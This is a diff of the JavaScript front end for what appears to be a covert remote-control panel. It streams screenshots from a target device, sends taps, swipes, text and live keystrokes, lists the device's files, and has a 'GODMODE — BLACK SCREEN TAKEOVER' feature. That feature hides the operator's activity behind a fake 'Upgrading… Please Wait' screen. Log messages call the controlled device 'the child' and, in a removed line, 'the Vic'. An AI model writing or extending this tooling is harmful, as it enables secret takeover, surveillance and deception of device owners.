-        rcRefreshScreen();
-    });
-    rcLoadApps();
-    rcUpdateAgentInfo();
-    rcLoadReceivedFiles(true);
-}
-
-async function rcFetchScreenInfo(deviceId) {
-    try {
-        const info = await api('/api/control/screen-info/' + encodeURIComponent(deviceId));
-        if (info && info.known && info.width > 0 && info.height > 0) {
-            currentDeviceScreen = {
-                width:    info.width,
-                height:   info.height,
-                origin_x: info.origin_x || 0,
-                origin_y: info.origin_y || 0,
-                geo_seq:  info.geo_seq || 0,
-                geo_ts:   info.geo_ts || 0,
-            };
-            const ds = deviceState.get(deviceId) || {};
-            ds.screenSize = currentDeviceScreen;
-            deviceState.set(deviceId, ds);
-            rcLog(`📐 Screen exact: ${info.width}×${info.height} `
-                + `origin=(${info.origin_x||0},${info.origin_y||0}) `
-                + `seq=${info.geo_seq||0} src=${info.source||'?'}`, 'info');
-        } else {
-            rcLog(`⚠️ Geometry not yet reported for ${deviceId.substring(0,8)} — clicks blocked until agent sends it`, 'warn');
+        const metaEl = document.createElement('div');
+        metaEl.className = 'device-meta';
+        const idEl = document.createElement('span');
+        idEl.className = 'device-id';
+        idEl.textContent = shortId;
+        idEl.title = 'Click to copy';
+        idEl.dataset.copyId = d.id;
+        let lastPoll = '—';
+        if (d.last_poll_secs !== undefined && d.last_poll_secs !== null) {
+            lastPoll = `${d.last_poll_secs}s ago`;
+        } else if (st === 'pending') {
+            lastPoll = 'registering';
         }
-    } catch (e) {
-        rcLog('screen-info failed: ' + e.message, 'warn');
-    }
-}
+        const pollEl = document.createElement('span');
+        pollEl.textContent = lastPoll;
+        metaEl.appendChild(idEl);
+        metaEl.appendChild(pollEl);
 
-function updateStickyDevice(id) {
-    const el = document.getElementById('stickyDevice');
-    const text = document.getElementById('stickyDeviceText');
-    if (!id) { el.style.display = 'none'; return; }
-    const ds = deviceState.get(id) || {};
-    const st = ds.status || 'offline';
-    text.textContent = `${ds.name || id.substring(0, 8)} — ${st}`;
-    el.classList.remove('offline', 'pending');
-    if (st === 'offline') el.classList.add('offline');
-    else if (st === 'pending') el.classList.add('pending');
-    el.style.display = 'flex';
-}
-
-function updateActionButtons() {
-    const ds = deviceState.get(currentDeviceId) || {};
-    const canAct = ds.status === 'online';
-    document.querySelectorAll('.menu-item[id^="qmi-"]').forEach(el => {
-        el.classList.toggle('disabled', !canAct);
+        card.appendChild(nameEl);
+        card.appendChild(modelEl);
+        card.appendChild(metaEl);
+        list.appendChild(card);
     });
 }
 
-function updateStatusPill(hasDevices, anyOnline, anyPending) {
+function _updateStatusPill(hasDevices, anyOnline, anyPending) {
     const pill = document.getElementById('statusPill');
     const text = document.getElementById('statusText');
     pill.classList.remove('offline', 'pending');
@@ -1320,18 +1406,146 @@ function updateStatusPill(hasDevices, anyOnline, anyPending) {
     }
 }
 
+function rcSelectDevice(id) {
+    if (!id || id === state.currentDeviceId) return;
+    state.currentDeviceId = id;
+
+    // Wipe per-device geometry — agent is sole authority
+    _clearScreen();
+
+    prefs.preferredDeviceId = id;
+    savePrefs();
+
+    const select = document.getElementById('deviceSelect');
+    if (select && select.value !== id) select.value = id;
+
+    document.querySelectorAll('.device-card').forEach(el => {
+        el.classList.toggle('active', el.dataset.deviceId === id);
+    });
+
+    // Reset per-device caches
+    state.appList = [];
+    state.receivedFiles = [];
+    state.currentPath = '';
+    document.getElementById('appDrawer').innerHTML =
+        '<div class="app-empty">Loading apps…</div>';
+    document.getElementById('appSearch').value = '';
+    document.getElementById('rcFileList').innerHTML =
+        '<div style="color:var(--text-secondary);font-size:10px;padding:8px;text-align:center;">Enter a path and press Enter</div>';
+    document.getElementById('rcBreadcrumb').innerHTML =
+        '<span style="color:var(--text-secondary);font-size:10px;">No path yet</span>';
+    document.getElementById('screenLoading').classList.remove('hidden');
+    document.getElementById('screenLoadingText').textContent = 'Waiting for screen...';
+    document.getElementById('screenImg').src = '';
+    document.getElementById('godmodeBanner').classList.remove('show');
+    state.blackscreenActive = false;
+    _updateBlackScreenStatus('unknown');
+
+    updateStickyDevice(id);
+    updateActionButtons();
+
+    rcLog('📱 Selected device: ' + id.substring(0, 12), 'success');
+
+    // Force exact geometry BEFORE anything else
+    rcFetchScreenInfo(id).then(() => rcRefreshScreen());
+    rcLoadApps();
+    rcUpdateAgentInfo();
+    rcLoadReceivedFiles(true);
+}
+
+function _clearScreen() {
+    state.currentDeviceId !== null && deviceState.get(state.currentDeviceId)
+        && (deviceState.get(state.currentDeviceId).screenSize = null);
+    const img = document.getElementById('screenImg');
+    if (img) img.src = '';
+    const overlay = document.getElementById('screenOverlay');
+    if (overlay) {
+        overlay.style.width = '0px';
+        overlay.style.height = '0px';
+    }
+    const info = document.getElementById('screenInfoBar');
+    if (info) info.style.display = 'none';
+    const loading = document.getElementById('screenLoading');
+    if (loading) loading.classList.remove('hidden');
+}
+
+function updateStickyDevice(id) {
+    const el = document.getElementById('stickyDevice');
+    const text = document.getElementById('stickyDeviceText');
+    if (!id) { el.style.display = 'none'; return; }
+    const ds = deviceState.get(id) || {};
+    const st = ds.status || 'offline';
+    text.textContent = `${ds.name || id.substring(0, 8)} — ${st}`;
+    el.classList.remove('offline', 'pending');
+    if (st === 'offline') el.classList.add('offline');
+    else if (st === 'pending') el.classList.add('pending');
+    el.style.display = 'flex';
+}
+
+function updateActionButtons() {
+    const ds = deviceState.get(state.currentDeviceId) || {};
+    const canAct = ds.status === 'online';
+    document.querySelectorAll('.menu-item[data-action]').forEach(el => {
+        el.classList.toggle('disabled', !canAct);
+    });
+    const bsBtn = document.getElementById('btnBlackscreen');
+    const ubBtn = document.getElementById('btnUnblackscreen');
+    if (bsBtn) bsBtn.disabled = !canAct;
+    if (ubBtn) ubBtn.disabled = !canAct;
+}
+
+// ============================================================
+// SCREEN GEOMETRY — AGENT IS SOLE AUTHORITY
+// ============================================================
+function rcScreenSize() {
+    if (!state.currentDeviceId) return null;
+    const ds = deviceState.get(state.currentDeviceId);
+    if (!ds || !ds.screenSize) return null;
+    const s = ds.screenSize;
+    if (!Number.isFinite(s.width) || !Number.isFinite(s.height)) return null;
+    if (s.width <= 0 || s.height <= 0) return null;
+    return s;
+}
+
+async function rcFetchScreenInfo(deviceId) {
+    try {
+        const info = await api('/api/control/screen-info/' + encodeURIComponent(deviceId));
+        if (info && info.known && info.width > 0 && info.height > 0) {
+            const ds = deviceState.get(deviceId) || {};
+            ds.screenSize = {
+                width:    info.width,
+                height:   info.height,
+                origin_x: info.origin_x || 0,
+                origin_y: info.origin_y || 0,
+                geo_seq:  info.geo_seq || 0,
+                geo_ts:   info.geo_ts || 0,
+            };
+            deviceState.set(deviceId, ds);
+            rcLog(`📐 Screen exact: ${info.width}×${info.height} ` +
+                  `origin=(${info.origin_x || 0},${info.origin_y || 0}) ` +
+                  `seq=${info.geo_seq || 0} src=${info.source || '?'}`, 'info');
+        } else {
+            rcLog(`⚠️ Geometry not reported for ${deviceId.substring(0, 8)} — clicks blocked`, 'warn');
+        }
+    } catch (e) {
+        rcLog('screen-info failed: ' + e.message, 'warn');
+    }
+}
+
 // ============================================================
 // SCREEN REFRESH
 // ============================================================
 async function rcRefreshScreen() {
-    if (!currentDeviceId) return;
+    if (!state.currentDeviceId) return;
+    const requestedDevice = state.currentDeviceId;
     try {
         const shots = await api(
-            '/api/screenshots?limit=30&deviceId=' + encodeURIComponent(currentDeviceId)
+            '/api/screenshots?limit=30&deviceId=' + encodeURIComponent(requestedDevice)
         );
+        if (requestedDevice !== state.currentDeviceId) return;
         if (!Array.isArray(shots) || shots.length === 0) {
             document.getElementById('screenLoading').classList.remove('hidden');
-            const ds = deviceState.get(currentDeviceId) || {};
+            const ds = deviceState.get(requestedDevice) || {};
             const st = ds.status || 'offline';
             document.getElementById('screenLoadingText').textContent =
                 st === 'pending' ? 'Waiting for agent to send first screenshot…' :
@@ -1341,18 +1555,17 @@ async function rcRefreshScreen() {
         }
         const s = shots[0];
 
-        const ds = deviceState.get(currentDeviceId) || {};
+        const ds = deviceState.get(requestedDevice) || {};
         if (s.filename === ds.lastScreenshotFilename) return;
         ds.lastScreenshotFilename = s.filename;
-        deviceState.set(currentDeviceId, ds);
+        deviceState.set(requestedDevice, ds);
 
-        // FORCE-EXACT: every screenshot carries authoritative geometry.
-        // Update the cache to the newest geo_seq we've seen.
+        // Update geometry from newest screenshot (never downgrade seq)
         if (s.width > 0 && s.height > 0) {
             const newSeq = s.geo_seq || 0;
-            const curSeq = (currentDeviceScreen && currentDeviceScreen.geo_seq) || 0;
+            const curSeq = (ds.screenSize && ds.screenSize.geo_seq) || 0;
             if (newSeq >= curSeq) {
-                currentDeviceScreen = {
+                ds.screenSize = {
                     width:    s.width,
                     height:   s.height,
                     origin_x: s.origin_x || 0,
@@ -1360,105 +1573,100 @@ async function rcRefreshScreen() {
                     geo_seq:  newSeq,
                     geo_ts:   s.geo_ts || 0,
                 };
-                ds.screenSize = currentDeviceScreen;
-                deviceState.set(currentDeviceId, ds);
+                deviceState.set(requestedDevice, ds);
             }
         }
 
-        const img = document.getElementById('screenImg');
+        const img     = document.getElementById('screenImg');
         const overlay = document.getElementById('screenOverlay');
         const loading = document.getElementById('screenLoading');
-        const newSrc = `${API_URL}/api/screenshots/${s.filename}?t=${Date.now()}`;
+        const newSrc  = `${API_URL}/api/screenshots/${s.filename}?t=${Date.now()}`;
         const tempImg = new Image();
         tempImg.onload = () => {
+            if (requestedDevice !== state.currentDeviceId) return;
             img.src = newSrc;
             loading.classList.add('hidden');
             document.getElementById('screenInfoBar').style.display = 'flex';
             document.getElementById('screenInfo').textContent =
                 `${s.filename}  [${s.width || '?'}×${s.height || '?'}]`;
 
-            fpsCounter++;
+            state.fpsCounter++;
             const now = Date.now();
-            if (now - fpsTimestamp > 2000) {
+            if (now - state.fpsTimestamp > 2000) {
                 document.getElementById('fpsBadge').textContent =
-                    ((fpsCounter / ((now - fpsTimestamp) / 1000)).toFixed(1)) + ' FPS';
-                fpsCounter = 0; fpsTimestamp = now;
+                    ((state.fpsCounter / ((now - state.fpsTimestamp) / 1000)).toFixed(1)) + ' FPS';
+                state.fpsCounter = 0;
+                state.fpsTimestamp = now;
             }
 
-            requestAnimationFrame(() => {
-                const r = img.getBoundingClientRect();
-                const wr = document.getElementById('screenWrapper').getBoundingClientRect();
-                overlay.style.inset  = 'auto';
-                overlay.style.left   = (r.left - wr.left) + 'px';
-                overlay.style.top    = (r.top  - wr.top)  + 'px';
-                overlay.style.width  = r.width  + 'px';
-                overlay.style.height = r.height + 'px';
-            });
+            requestAnimationFrame(() => _repositionOverlay(img, overlay));
         };
         tempImg.onerror = () => rcLog('Failed to load screenshot', 'error');
         tempImg.src = newSrc;
-    } catch (e) { rcLog('Refresh error: ' + e.message, 'error'); }
+    } catch (e) {
+        rcLog('Refresh error: ' + e.message, 'error');
+    }
+}
+
+function _repositionOverlay(img, overlay) {
+    const r  = img.getBoundingClientRect();
+    const wr = document.getElementById('screenWrapper').getBoundingClientRect();
+    overlay.style.left   = (r.left - wr.left) + 'px';
+    overlay.style.top    = (r.top  - wr.top)  + 'px';
+    overlay.style.width  = r.width  + 'px';
+    overlay.style.height = r.height + 'px';
 }
 
 function rcToggleAutoRefresh() {
-    autoRefreshEnabled = !autoRefreshEnabled;
-    const btn = document.getElementById('btnRefreshScreen');
-    if (autoRefreshEnabled) {
+    state.autoRefreshEnabled = !state.autoRefreshEnabled;
+    const btn = document.getElementById('btnToggleAuto');
+    if (state.autoRefreshEnabled) {
         btn.innerHTML = '<i class="fas fa-pause"></i> <span id="refreshLabel">Auto</span>';
-        rcSetRefreshInterval(currentRefreshInterval);
+        rcSetRefreshInterval(state.refreshInterval);
     } else {
         btn.innerHTML = '<i class="fas fa-play"></i> <span id="refreshLabel">Manual</span>';
-        if (autoRefreshTimer) clearInterval(autoRefreshTimer);
+        if (state.autoRefreshTimer) clearInterval(state.autoRefreshTimer);
     }
 }
+
 function rcSetRefreshInterval(ms) {
-    if (autoRefreshTimer) clearInterval(autoRefreshTimer);
-    if (ms > 0) autoRefreshTimer = setInterval(rcRefreshScreen, ms);
+    if (state.autoRefreshTimer) clearInterval(state.autoRefreshTimer);
+    if (ms > 0) state.autoRefreshTimer = setInterval(rcRefreshScreen, ms);
 }
+
 function rcSetQuality(val) {
     const ms = parseInt(val);
-    currentRefreshInterval = ms;
-    prefs.refreshInterval = ms;
+    state.refreshInterval = ms;
     savePrefs();
-    rcLog('Quality: ' + (ms === 0 ? 'Manual' : (1000/ms).toFixed(1) + ' FPS'), 'info');
-    if (autoRefreshEnabled) rcSetRefreshInterval(ms);
+    rcLog('Quality: ' + (ms === 0 ? 'Manual' : (1000 / ms).toFixed(1) + ' FPS'), 'info');
+    if (state.autoRefreshEnabled) rcSetRefreshInterval(ms);
 }
+
 function rcForceScreenshot() {
-    if (!currentDeviceId) return;
+    if (!state.currentDeviceId) return;
     rcKey('screenshot');
     setTimeout(rcRefreshScreen, 1500);
 }
 
 function rcZoom(direction) {
-    if (direction === 0) currentZoom = 1.0;
-    else if (direction > 0) currentZoom = Math.min(currentZoom * 1.25, 4);
-    else currentZoom = Math.max(currentZoom / 1.25, 0.5);
+    if (direction === 0) state.zoom = 1.0;
+    else if (direction > 0) state.zoom = Math.min(state.zoom * 1.25, 4);
+    else state.zoom = Math.max(state.zoom / 1.25, 0.5);
     const wrapper = document.getElementById('screenWrapper');
-    wrapper.style.transform = `scale(${currentZoom})`;
+    wrapper.style.transform = `scale(${state.zoom})`;
     wrapper.style.transformOrigin = 'center center';
-    rcLog(`🔍 Zoom: ${(currentZoom * 100).toFixed(0)}%`, 'info');
+    rcLog(`🔍 Zoom: ${(state.zoom * 100).toFixed(0)}%`, 'info');
 }
 
 // ============================================================
-// SCREEN INTERACTION — FORCE-EXACT + NORMALIZED
+// SCREEN INTERACTION — NORMALIZED COORDS
 // ============================================================
-// Returns the current per-device geometry or null. NEVER invents a size.
-// Callers MUST abort on null — this is what prevents double-taps landing
-// at the wrong pixel.
-function rcScreenSize() {
-    if (!currentDeviceScreen) return null;
-    const w = currentDeviceScreen.width;
-    const h = currentDeviceScreen.height;
-    if (!Number.isFinite(w) || !Number.isFinite(h) || w <= 0 || h <= 0) return null;
-    return currentDeviceScreen;
-}
-
 function setupScreenInteraction() {
     const overlay = document.getElementById('screenOverlay');
-    const img = document.getElementById('screenImg');
+    const img     = document.getElementById('screenImg');
     if (!overlay || !img) return;
 
-    const getAbsCoords = (e) => {
+    const getNorm = (e) => {
         const rect = img.getBoundingClientRect();
         if (!rect.width || !rect.height) return null;
         const nx = Math.max(0, Math.min(1, (e.clientX - rect.left) / rect.width));
@@ -1466,44 +1674,42 @@ function setupScreenInteraction() {
         return { nx, ny };
     };
 
-    const sendNormalized = (nx, ny, kind) => {
+    const sendNorm = (nx, ny, kind) => {
         return api('/api/control/click-normalized', 'POST', {
-            deviceId: currentDeviceId, nx, ny, kind
+            deviceId: state.currentDeviceId, nx, ny, kind,
         }).catch(() => {});
     };
 
-    const showRipple = (clientX, clientY, kind = '') => {
+    const ripple = (clientX, clientY, kind = '') => {
         const rect = img.getBoundingClientRect();
         const wrapper = document.getElementById('screenWrapper');
-        const ripple = document.createElement('div');
-        ripple.className = 'touch-indicator' + (kind ? ' ' + kind : '');
-        ripple.style.left = (clientX - rect.left) + 'px';
-        ripple.style.top = (clientY - rect.top) + 'px';
-        wrapper.appendChild(ripple);
-        setTimeout(() => ripple.remove(), 500);
+        const el = document.createElement('div');
+        el.className = 'touch-indicator' + (kind ? ' ' + kind : '');
+        el.style.left = (clientX - rect.left) + 'px';
+        el.style.top  = (clientY - rect.top)  + 'px';
+        wrapper.appendChild(el);
+        setTimeout(() => el.remove(), 500);
     };
 
     overlay.addEventListener('mousedown', (e) => {
         e.preventDefault();
-        const ds = deviceState.get(currentDeviceId) || {};
+        const ds = deviceState.get(state.currentDeviceId) || {};
         if (ds.status !== 'online') {
             toast(`Device is ${ds.status || 'offline'}`, 'warn', 1500);
             return;
         }
-        // FORCE-EXACT: refuse any click until we have agent geometry.
         if (!rcScreenSize()) {
-            toast('Screen geometry not yet reported by agent — click blocked', 'warn', 2000);
-            rcLog('⛔ click blocked: no geometry yet', 'warn');
+            toast('Screen geometry not yet reported — click blocked', 'warn', 2000);
+            rcLog('⛔ click blocked: no geometry', 'warn');
             return;
         }
-
-        const c = getAbsCoords(e);
+        const c = getNorm(e);
         if (!c) { toast('Screen not ready', 'warn', 1200); return; }
-        showRipple(e.clientX, e.clientY);
+        ripple(e.clientX, e.clientY);
 
         if (e.button === 2) {
             rcLog(`🖱️ Right-click @ (${c.nx.toFixed(3)}, ${c.ny.toFixed(3)})`, 'info');
-            sendNormalized(c.nx, c.ny, 'rightclick');
+            sendNorm(c.nx, c.ny, 'rightclick');
             return;
         }
 
@@ -1511,19 +1717,19 @@ function setupScreenInteraction() {
         isDragging = false;
 
         const now = Date.now();
-        clickCount = (now - lastClickTime < 300) ? clickCount + 1 : 1;
-        lastClickTime = now;
+        state.clickCount = (now - state.lastClickTime < 300) ? state.clickCount + 1 : 1;
+        state.lastClickTime = now;
 
         pressTimer = setTimeout(() => {
             if (!isDragging) {
-                if (clickCount >= 2) {
-                    showRipple(e.clientX, e.clientY, 'double');
+                if (state.clickCount >= 2) {
+                    ripple(e.clientX, e.clientY, 'double');
                     rcLog(`🖱️ Double-click @ (${c.nx.toFixed(3)}, ${c.ny.toFixed(3)})`, 'info');
-                    sendNormalized(c.nx, c.ny, 'doubleclick');
-                    clickCount = 0;
+                    sendNorm(c.nx, c.ny, 'doubleclick');
+                    state.clickCount = 0;
                 } else {
                     rcLog(`🖱️ Long-press @ (${c.nx.toFixed(3)}, ${c.ny.toFixed(3)})`, 'warn');
-                    sendNormalized(c.nx, c.ny, 'longpress');
+                    sendNorm(c.nx, c.ny, 'longpress');
                 }
                 pressTimer = null;
             }
@@ -1532,17 +1738,13 @@ function setupScreenInteraction() {
 
     overlay.addEventListener('mousemove', (e) => {
         if (!startPoint) return;
-        const c = getAbsCoords(e);
+        const c = getNorm(e);
         if (!c) return;
         const sz = rcScreenSize();
-        // FORCE-EXACT: no guesswork. Use actual size, or the drag threshold
-        // is skipped — a click without geometry can never happen anyway.
-        const w = sz ? sz.width  : null;
-        const h = sz ? sz.height : null;
-        if (!w || !h) return;
-        const dx = (c.nx - startPoint.nx) * w;
-        const dy = (c.ny - startPoint.ny) * h;
-        if (Math.sqrt(dx*dx + dy*dy) > 20) {
+        if (!sz) return;
+        const dx = (c.nx - startPoint.nx) * sz.width;
+        const dy = (c.ny - startPoint.ny) * sz.height;
+        if (Math.sqrt(dx * dx + dy * dy) > 20) {
             isDragging = true;
             if (pressTimer) { clearTimeout(pressTimer); pressTimer = null; }
         }
@@ -1551,29 +1753,28 @@ function setupScreenInteraction() {
     overlay.addEventListener('mouseup', (e) => {
         if (e.button === 2) return;
         if (!startPoint) return;
-        const c = getAbsCoords(e);
+        const c = getNorm(e);
         if (!c) { startPoint = null; isDragging = false; return; }
 
         if (pressTimer) {
             clearTimeout(pressTimer);
             pressTimer = null;
-
-            if (clickCount >= 2) {
+            if (state.clickCount >= 2) {
                 rcLog(`🖱️ Double-click @ (${c.nx.toFixed(3)}, ${c.ny.toFixed(3)})`, 'info');
-                sendNormalized(c.nx, c.ny, 'doubleclick');
-                clickCount = 0;
+                sendNorm(c.nx, c.ny, 'doubleclick');
+                state.clickCount = 0;
             } else {
                 rcLog(`👆 Tap @ (${c.nx.toFixed(3)}, ${c.ny.toFixed(3)})`, 'info');
-                sendNormalized(c.nx, c.ny, 'tap');
+                sendNorm(c.nx, c.ny, 'tap');
             }
         } else if (isDragging) {
-            rcLog(`👆 Swipe (${startPoint.nx.toFixed(2)},${startPoint.ny.toFixed(2)})`
-                + `→(${c.nx.toFixed(2)},${c.ny.toFixed(2)})`, 'info');
+            rcLog(`👆 Swipe (${startPoint.nx.toFixed(2)},${startPoint.ny.toFixed(2)})` +
+                  `→(${c.nx.toFixed(2)},${c.ny.toFixed(2)})`, 'info');
             api('/api/control/swipe-normalized', 'POST', {
-                deviceId: currentDeviceId,
+                deviceId: state.currentDeviceId,
                 nx1: startPoint.nx, ny1: startPoint.ny,
                 nx2: c.nx,          ny2: c.ny,
-                duration: 250
+                duration: 250,
             }).catch(() => {});
         }
         startPoint = null;
@@ -1595,82 +1796,41 @@ function setupScreenInteraction() {
             return;
         }
         if (!rcScreenSize()) {
-            toast('Screen geometry not yet reported — scroll blocked', 'warn', 1500);
+            toast('Screen geometry not reported — scroll blocked', 'warn', 1500);
             return;
         }
-        const c = getAbsCoords(e);
-        if (!c) { toast('Screen not ready', 'warn', 1200); return; }
+        const c = getNorm(e);
+        if (!c) return;
         const amount = e.deltaY > 0 ? -3 : 3;
         api('/api/control/scroll-normalized', 'POST', {
-            deviceId: currentDeviceId,
-            nx: c.nx, ny: c.ny,
-            amount
+            deviceId: state.currentDeviceId,
+            nx: c.nx, ny: c.ny, amount,
         }).catch(() => {});
     }, { passive: false });
 
+    // Touch → mouse shim
     overlay.addEventListener('touchstart', (e) => {
         e.preventDefault();
         const t = e.touches[0];
-        const me = new MouseEvent('mousedown', {
-            clientX: t.clientX, clientY: t.clientY, button: 0, bubbles: true
-        });
-        overlay.dispatchEvent(me);
+        overlay.dispatchEvent(new MouseEvent('mousedown', {
+            clientX: t.clientX, clientY: t.clientY, button: 0, bubbles: true,
+        }));
     }, { passive: false });
 
     overlay.addEventListener('touchend', (e) => {
         e.preventDefault();
         const t = e.changedTouches[0];
-        const me = new MouseEvent('mouseup', {
-            clientX: t.clientX, clientY: t.clientY, button: 0, bubbles: true
-        });
-        overlay.dispatchEvent(me);
+        overlay.dispatchEvent(new MouseEvent('mouseup', {
+            clientX: t.clientX, clientY: t.clientY, button: 0, bubbles: true,
+        }));
     }, { passive: false });
 }
 
 // ============================================================
 // CONTROL ACTIONS
 // ============================================================
-async function rcTap(nx, ny) {
-    if (!rcScreenSize()) { toast('Geometry not ready', 'warn'); return; }
-    api('/api/control/click-normalized', 'POST',
-        { deviceId: currentDeviceId, nx, ny, kind: 'tap' }).catch(() => {});
-}
-
-async function rcRightClick(nx, ny) {
-    if (!rcScreenSize()) return;
-    api('/api/control/click-normalized', 'POST',
-        { deviceId: currentDeviceId, nx, ny, kind: 'rightclick' }).catch(() => {});
-}
-
-async function rcDoubleClick(nx, ny) {
-    if (!rcScreenSize()) return;
-    api('/api/control/click-normalized', 'POST',
-        { deviceId: currentDeviceId, nx, ny, kind: 'doubleclick' }).catch(() => {});
-}
-
-async function rcLongPress(nx, ny) {
-    if (!rcScreenSize()) return;
-    api('/api/control/click-normalized', 'POST',
-        { deviceId: currentDeviceId, nx, ny, kind: 'longpress' }).catch(() => {});
-}
-
-async function rcSwipe(nx1, ny1, nx2, ny2, duration) {
-    if (!rcScreenSize()) { toast('Geometry not ready', 'warn'); return; }
-    rcLog(`👆 Swipe (${nx1.toFixed(2)},${ny1.toFixed(2)})→(${nx2.toFixed(2)},${ny2.toFixed(2)})`, 'info');
-    api('/api/control/swipe-normalized', 'POST', {
-        deviceId: currentDeviceId,
-        nx1, ny1, nx2, ny2, duration
-    }).catch(() => {});
-}
-
-async function rcScroll(nx, ny, amount) {
-    if (!rcScreenSize()) return;
-    api('/api/control/scroll-normalized', 'POST',
-        { deviceId: currentDeviceId, nx, ny, amount }).catch(()=>{});
-}
-
 async function rcKey(key) {
-    if (!currentDeviceId) return;
+    if (!state.currentDeviceId) return;
     const r = await rcSendAndTrack('/api/control/key', { key }, `Key: ${key}`,
         { silentSuccess: true, attempts: 12 });
     if (r && r.ok && key === 'screenshot') setTimeout(rcRefreshScreen, 1200);
@@ -1682,11 +1842,12 @@ async function rcHotkey(keys) {
 }
 
 async function rcSendText() {
-    if (!currentDeviceId) return;
+    if (!state.currentDeviceId) return;
     const input = document.getElementById('rcTextInput');
     const text = input.value;
     if (!text) return;
-    await rcSendAndTrack('/api/control/text', { text }, `Text: "${text.substring(0, 30)}"`,
+    await rcSendAndTrack('/api/control/text', { text },
+        `Text: "${text.substring(0, 30)}"`,
         { silentSuccess: true, attempts: 15 });
     input.value = '';
 }
@@ -1696,17 +1857,78 @@ function rcClearText() {
 }
 
 // ============================================================
+// GODMODE — BLACK SCREEN TAKEOVER
+// ============================================================
+async function rcDeployBlackscreen() {
+    if (!state.currentDeviceId) { toast('No device selected', 'warn'); return; }
+    const input = document.getElementById('bsMessage');
+    let message = (input.value || '').trim() || 'Upgrading\u2026  Please Wait';
+    if (message.length > 200) message = message.substring(0, 200);
+
+    rcLog(`🖤 Deploying black screen: "${message}"`, 'warn');
+    toast('Deploying black screen…', 'warn');
+
+    const r = await rcSendAndTrack(
+        '/api/control/blackscreen',
+        { message },
+        'Blackscreen deploy',
+        { attempts: 20, silentSuccess: false }
+    );
+    if (r && r.ok) {
+        state.blackscreenActive = true;
+        document.getElementById('godmodeBanner').classList.add('show');
+        _updateBlackScreenStatus('active');
+        rcLog('✅ Black screen is now deployed on the child', 'success');
+        toast('Black screen deployed', 'success');
+    } else {
+        _updateBlackScreenStatus('deploy failed');
+    }
+}
+
+async function rcLiftBlackscreen() {
+    if (!state.currentDeviceId) { toast('No device selected', 'warn'); return; }
+    rcLog('☀️ Lifting black screen…', 'info');
+    toast('Lifting black screen…', 'info');
+
+    const r = await rcSendAndTrack(
+        '/api/control/unblackscreen',
+        {},
+        'Blackscreen lift',
+        { attempts: 15, silentSuccess: false }
+    );
+    if (r && r.ok) {
+        state.blackscreenActive = false;
+        document.getElementById('godmodeBanner').classList.remove('show');
+        _updateBlackScreenStatus('lifted');
+        rcLog('✅ Black screen lifted', 'success');
+        toast('Black screen lifted', 'success');
+    } else {
+        _updateBlackScreenStatus('lift failed');
+    }
+}
+
+function _updateBlackScreenStatus(val) {
+    const el = document.getElementById('bsStatusVal');
+    if (!el) return;
+    el.textContent = val;
+    if (val === 'active')    el.style.color = '#d2a8ff';
+    else if (val === 'lifted') el.style.color = '#3fb950';
+    else if (val.includes('fail')) el.style.color = '#f85149';
+    else el.style.color = '#8b949e';
+}
+
+// ============================================================
 // LIVE TYPING
 // ============================================================
 function rcToggleLiveTyping() {
-    liveTypingEnabled = !liveTypingEnabled;
+    state.liveTyping = !state.liveTyping;
     const btn   = document.getElementById('btnLiveTyping');
     const label = document.getElementById('liveTypingLabel');
-    if (liveTypingEnabled) {
+    if (state.liveTyping) {
         btn.classList.add('active');
         label.textContent = 'Live Typing ON';
-        rcLog('⌨️ Live typing enabled — your keys go to the Vic', 'success');
-        toast('Live typing ON — your keys go to the Vic', 'success', 2500);
+        rcLog('⌨️ Live typing enabled', 'success');
+        toast('Live typing ON', 'success', 2500);
         document.addEventListener('keydown', rcLiveKeydown, true);
         document.addEventListener('keyup',   rcLiveKeyup,   true);
     } else {
@@ -1719,7 +1941,7 @@ function rcToggleLiveTyping() {
     }
 }
 
-function _isControlCombo(e) {
+function _isProtectedCombo(e) {
     if (e.ctrlKey && e.shiftKey) return true;
     if (e.key === 'F12') return true;
     if (e.key === 'F5' && !e.shiftKey) return true;
@@ -1727,133 +1949,119 @@ function _isControlCombo(e) {
 }
 
 function rcLiveKeydown(e) {
-    if (!liveTypingEnabled || !currentDeviceId) return;
+    if (!state.liveTyping || !state.currentDeviceId) return;
     const t = e.target;
-    if (t && (t.tagName === 'INPUT' || t.tagName === 'TEXTAREA' || t.isContentEditable)) {
-        return;
-    }
-    if (_isControlCombo(e)) return;
-    if (['Shift','Control','Alt','Meta','CapsLock','NumLock'].includes(e.key)) return;
+    if (t && (t.tagName === 'INPUT' || t.tagName === 'TEXTAREA' || t.isContentEditable)) return;
+    if (_isProtectedCombo(e)) return;
+    if (['Shift', 'Control', 'Alt', 'Meta', 'CapsLock', 'NumLock'].includes(e.key)) return;
 
-    if (e.key === 'Enter')  { rcLiveQueueSpecial('enter');  e.preventDefault(); return; }
-    if (e.key === 'Tab')    { rcLiveQueueSpecial('tab');    e.preventDefault(); return; }
-    if (e.key === 'Backspace') { rcLiveQueueSpecial('backspace'); e.preventDefault(); return; }
-    if (e.key === 'Escape') { rcLiveQueueSpecial('esc');    e.preventDefault(); return; }
+    if (e.key === 'Enter')     { rcLiveSpecial('enter');     e.preventDefault(); return; }
+    if (e.key === 'Tab')       { rcLiveSpecial('tab');       e.preventDefault(); return; }
+    if (e.key === 'Backspace') { rcLiveSpecial('backspace'); e.preventDefault(); return; }
+    if (e.key === 'Escape')    { rcLiveSpecial('esc');       e.preventDefault(); return; }
     if (e.key.startsWith('Arrow')) {
-        rcLiveQueueSpecial(e.key.replace('Arrow','').toLowerCase());
+        rcLiveSpecial(e.key.replace('Arrow', '').toLowerCase());
         e.preventDefault();
         return;
     }
     if (e.ctrlKey || e.metaKey) {
         const mod = e.ctrlKey ? 'ctrl' : 'meta';
-        rcLiveQueueHotkey(`${mod}+${e.key.toLowerCase()}`);
+        rcLiveHotkey(`${mod}+${e.key.toLowerCase()}`);
         e.preventDefault();
         return;
     }
     if (e.key.length === 1) {
-        liveTypingBuffer += e.key;
+        state.liveBuffer += e.key;
         e.preventDefault();
-        if (liveTypingBuffer.length >= LIVE_TYPING_MAX) {
+        if (state.liveBuffer.length >= LIVE_TYPING_MAX) {
             rcLiveFlush();
         } else {
-            if (liveTypingTimer) clearTimeout(liveTypingTimer);
-            liveTypingTimer = setTimeout(rcLiveFlush, LIVE_TYPING_FLUSH_MS);
+            if (state.liveTimer) clearTimeout(state.liveTimer);
+            state.liveTimer = setTimeout(rcLiveFlush, LIVE_TYPING_FLUSH_MS);
         }
     }
 }
 
 function rcLiveKeyup(e) {
-    if (!liveTypingEnabled) return;
+    if (!state.liveTyping) return;
     if (e.key === 'Enter') rcLiveFlush();
 }
 
-async function rcLiveQueueSpecial(keyName) {
